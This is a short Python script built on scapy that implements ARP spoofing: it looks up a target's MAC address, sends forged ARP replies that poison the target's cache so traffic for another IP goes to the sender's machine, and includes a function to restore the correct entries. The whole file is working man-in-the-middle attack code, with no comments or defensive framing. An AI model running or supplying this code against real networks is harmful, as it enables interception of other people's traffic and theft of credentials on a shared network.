import scapy.all as scapy

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc if answered_list else None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"Cannot find mac for {target_ip}")
        return
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(arp_response, verbose=False)

def restore(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    if target_mac is None or spoof_mac is None:
        print(f"Cannot find mac for {target_ip} or {spoof_ip}")
        return
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    scapy.send(arp_response, count=4, verbose=False)